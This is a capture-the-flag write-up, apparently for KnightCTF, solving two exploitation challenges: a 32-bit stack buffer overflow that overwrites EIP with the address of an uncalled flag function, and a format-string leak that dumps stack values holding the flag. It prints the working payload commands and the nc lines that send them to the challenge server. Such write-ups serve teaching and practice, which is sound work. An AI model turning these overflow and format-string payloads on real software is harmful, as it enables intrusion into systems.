## get_sword

the binary is 32 bit binary

on inspecting with gdb we can find the following functions:

![image](https://github.com/oxo-crab/Knightctf/assets/111520157/71fb910b-36ff-4188-815a-acd2a7bd0a28)

here, the important functions are getSword(never called) which prints the flag and intro, the function in which we perform buffer overflow

using ghidra to see what happens in getsword and intro:

![image](https://github.com/oxo-crab/Knightctf/assets/111520157/9b7bdb50-929c-43bf-9612-a19bbc13f213)

![image](https://github.com/oxo-crab/Knightctf/assets/111520157/8a1b7b7f-6e68-4005-9288-ab3a0a727633)

since getSword is never called, the main objective is to overwrite getSword address in eip so that it can be called after intro is done executing, this isn't pie as the filedoesn't show it the binary as shared object

`get_sword: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=4a9b260935bf815a04350e3bb9e0e4422f504b2a, for GNU/Linux 4.4.0, not stripped`

so a seg fault is caused after 28 bytes of 'a', then 4 byts of ebp register needs to be filled as well to write into eip

so final payload should look like this

`python2 -c 'print "a"*32 +"\x18\x92\x04\x08"' > payload `

sending that to binary does the trick:

`nc 173.255.201.51 31337 < payload `

flag: KCTF{so_you_g0t_the_sw0rd}


## the dragon secret's scroll

![image](https://github.com/oxo-crab/Knightctf/assets/111520157/a2f5ceab-95fa-4513-aaaf-354bcf9accc4)

for this one, just nc was given.
I tried format specifier and it seemed to work

after sending : `python2 'print "%p"*50' > payload`
`nc 173.255.201.51 51337 < payload `

i get the result

![image](https://github.com/oxo-crab/Knightctf/assets/111520157/778fbea4-3e4d-4e37-9933-edd078a88e45)

using hex to text conversation gives meaningful words for 0x4152447b4654434b 0x6c4f7243734e4f47 0x7d6c

![image](https://github.com/oxo-crab/Knightctf/assets/111520157/58c1c027-aa02-4a3e-bb8d-a760d8814447)

after rearranging 

![image](https://github.com/oxo-crab/Knightctf/assets/111520157/21d59837-a05b-4634-8755-d35cd02b1f6a)

flag: KCTF{DRAGONsCrOll}









